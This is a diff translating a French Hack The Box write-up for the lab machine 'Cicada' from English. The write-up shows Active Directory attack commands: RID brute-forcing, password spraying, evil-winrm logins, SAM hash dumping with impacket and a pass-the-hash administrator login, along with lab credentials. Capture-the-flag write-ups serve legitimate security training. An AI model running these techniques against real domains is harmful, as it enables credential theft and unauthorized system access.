@@ -9,13 +9,13 @@ title: "HTB: Cicada"
 type: "post"
 ---
 
-* Platforme: Hack The Box
+* Platforme: HackTheBox
 * Lien: [Cicada](https://app.hackthebox.com/machines/Cicada)
 * Niveau: Facile
 * OS: Windows
 ---
 
-Cicada est un contrôleur de domaine Active Directory. Nous sommes en mesure de nous connecter via SMB avec le compte invité, ce qui nous permet de récupérer une note contenant un mot de passe. Grâce à une attaque par force brute RID, nous énumérons les noms d'utilisateurs du domaine et découvrons des identifiants valides, que nous utilisons pour nous connecter via LDAP. Une énumération plus poussée révèle un mot de passe stocké dans le champ de description d'un utilisateur, ce qui permet d'accéder à un autre partage SMB contenant un script PowerShell avec des informations d'identification supplémentaires. Nous les utilisons pour obtenir un accès initial au système via WinRM. L'utilisateur compromis possède le privilège `SeBackupPrivilege` et est membre du groupe `Backup Operators`, ce qui offre deux façons distinctes d'exploiter la cible.
+Cicada est un contrôleur de domaine Active Directory. Nous sommes en mesure de nous connecter via SMB avec le compte invité, ce qui nous permet de récupérer une note contenant un mot de passe. Grâce à une attaque par force brute RID, nous énumérons les noms d'utilisateurs du domaine et découvrons des identifiants valides, que nous utilisons pour nous connecter via LDAP. Une énumération plus poussée révèle un mot de passe stocké dans le champ de description d'un utilisateur. Avec ce mot de passe nous accédons à un autre partage SMB contenant un script PowerShell avec des informations d'identification supplémentaires. Nous les utilisons pour obtenir un accès initial au système via WinRM. L'utilisateur compromis possède le privilège `SeBackupPrivilege` et est membre du groupe `Backup Operators`, ce qui offre deux possibilités d'exploitation.
 
 Addresse IP cible - `10.10.11.35`
 
@@ -130,7 +130,7 @@ Nous avons maintenant besoin d'un nom d'utilisateur, nous pouvons trouver les no
 netexec smb cicada.htb -u guest -p '' --rid-brute
 ```
 
-Après l'extraction des noms d'utilisateur, nous obtenons la liste suivante.
+Après leur extraction, nous obtenons la liste suivante.
 
 ![SMB accounts](/images/HTB-Cicada/accounts.png)
 
@@ -226,7 +226,7 @@ Nous savons maintenant que le mot de passe `aRt$Lp#7t*VQ!3` appartient à `david
 
 ---
 
-Avec ces nouveaux identifiants, nous énumérons à nouveau le SMB.
+Avec ces nouveaux identifiants, nous énumérons à nouveau SMB.
 
 ```
 netexec smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
@@ -260,9 +260,9 @@ Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath
 
 ## Shell en tant que emily.oscars
 
-The script has the password (`Q!3@Lp#M6b*7t*Vt`)  of `emily.oscars`. With the result of our nmap scan we can see that winrm is running on port 5985. So let's check if we can login with it.
+Le script contient le mot de passe (`Q!3@Lp#M6b*7t*Vt`) de `emily.oscars`. Nous savons d'après le scan nmap que winrm tourne sur le port 5985. Vérifions donc si nous pouvons nous connecter avec.
 
-Make a list with the three passwords we have so far and run it against the user names list.
+Faites une liste avec les trois mots de passe que nous avons jusqu'à présent et comparez-la à la liste des noms d'utilisateurs.
 
 ```
 netexec winrm cicada.htb -u users.txt -p passwords.txt
@@ -270,7 +270,7 @@ netexec winrm cicada.htb -u users.txt -p passwords.txt
 
 ![WinRM valid credentials](/images/HTB-Cicada/winrm_valid.png)
 
-`emily.oscars:Q!3@Lp#M6b*7t*Vt` are the only valid credentials. 
+`emily.oscars:Q!3@Lp#M6b*7t*Vt` sont les seules informations d'identification valides. 
 
 ```
 evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
@@ -278,24 +278,24 @@ evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
 
 ![emily.oscars WinRM login](/images/HTB-Cicada/foothold.png)
 
-The user flag is readable at `C:\Users\emily.oscars.CICADA\Desktop\user.txt`.
+Le drapeau utilisateur peut être lu à l'adresse suivante : `C:\Users\emily.oscars.CICADA\Desktop\user.txt`.
 
-We can see that `emily.oscars` has the `SeBackupPrivilege` and with `net user emily.oscars` we learn that she is a member of the `Backup Operators` group.
+Nous observons que `emily.oscars` possède le privilège `SeBackupPrivilege` et avec `net user emily.oscars` nous apprenons qu'elle est membre du groupe `Backup Operators`.
 
-> While members of the **Backup Operators group** are inherently granted the **SeBackupPrivilege** by default, the reverse is not always true. A user can have the **SeBackupPrivilege** without being a member of the **Backup Operators** group because privileges in Windows can be assigned explicitly to users or groups independently of group membership.
+> Bien que les membres du groupe **Backup Operators** bénéficient par défaut du privilège **SeBackupPrivilege**, l'inverse n'est pas toujours vrai. Un utilisateur peut avoir le privilège **SeBackupPrivilege** sans être membre du groupe **Backup Operators** parce que les privilèges sous Windows peuvent être attribués explicitement à des utilisateurs ou à des groupes indépendamment de l'appartenance à un groupe.
 
 ![emily.oscars group membership](/images/HTB-Cicada/backup_operators_group.png)
 
 
 ## Elévation de Privilèges
 
-Because the current user we control has the `SeBackupPrivilege` and is a member of the `Backup Operators group` we can access the root flag via two different methods.
+Puisque l'utilisateur que nous contrôlons a le privilège `SeBackupPrivilege` et est membre du groupe `Backup Operators`, nous pouvons accéder au drapeau root par deux méthodes différentes.
 
 ### Méthode Hash Dump
 
-This [article](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) demonstrates how to abuse `SeBackupPrivilege`.
+Cet [article](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) explique comment abuser de `SeBackupPrivilege`.
 
-Within the `emily.oscars` shell execute the following commands
+Avec le shell `emily.oscars`, exécutez les commandes suivantes
 
 ```
 mkdir Temp
@@ -318,7 +318,7 @@ download system
 
 ![Registry files download](/images/HTB-Cicada/dl_files.png)
 
-On our local machine we dump the admin hash with the following command.
+Sur notre machine locale, nous récupérons le hash de l'administrateur avec impacket.
 
 ```
 impacket-secretsdump -sam sam -system system local
@@ -326,9 +326,9 @@ impacket-secretsdump -sam sam -system system local
 
 ![impacket hash dump](/images/HTB-Cicada/hash_dump.png)
 
-> `pypykatz` can also be used to dump the hashes with the command `pypykatz registry --sam sam system`.
+> `pypykatz` peut aussi être utilisé pour extraire les hashs avec la commande `pypykatz registry --sam sam system`.
 
-We can now login as the Administrator and read the root flag.
+Nous pouvons maintenant nous connecter en tant qu'administrateur et lire le drapeau root.
 
 ```
 evil-winrm -i cicada.htb -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
@@ -338,9 +338,9 @@ evil-winrm -i cicada.htb -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
 
 ### Attaque Locale
 
-You can also use the method available [here](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html#backup-operators). You will need to go to [this](https://github.com/giuliano108/SeBackupPrivilege) Github repo to get `SeBackupPrivilegeUtils.dll` and `SeBackupPrivilegeCmdLets.dll`.
+Nous pouvons également utiliser la méthode présentée [ici](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html#backup-operators). Vous devrez aller sur [ce repo Github](https://github.com/giuliano108/SeBackupPrivilege) pour obtenir `SeBackupPrivilegeUtils.dll` et `SeBackupPrivilegeCmdLets.dll`.
 
-1. After cloning the repo we send the files to the target via our evil-winrm shell.
+1. Après avoir cloné le repo, nous transférons les fichiers vers la cible via notre shell evil-winrm.
 
 ```
 upload /home/kscorpio/Machines/HTB/Cicada//SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
@@ -350,7 +350,7 @@ upload /home/kscorpio/Machines/HTB/Cicada//SeBackupPrivilege/SeBackupPrivilegeCm
 
 ![SeBackup files](/images/HTB-Cicada/SeBackup_files.png)
 
-2. Import the libraries
+2. Nous importons les bibliothèques
 
 ```
 Import-Module .\SeBackupPrivilegeUtils.dll
@@ -359,7 +359,7 @@ Import-Module .\SeBackupPrivilegeCmdLets.dll
 
 ![Modules Import](/images/HTB-Cicada/Modules_Import.png)
 
-3. Copy the root flag
+3. Enfin, nous copions le drapeau root
 
 ```
 Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt C:\Users\emily.oscars.CICADA\Documents\root.txt
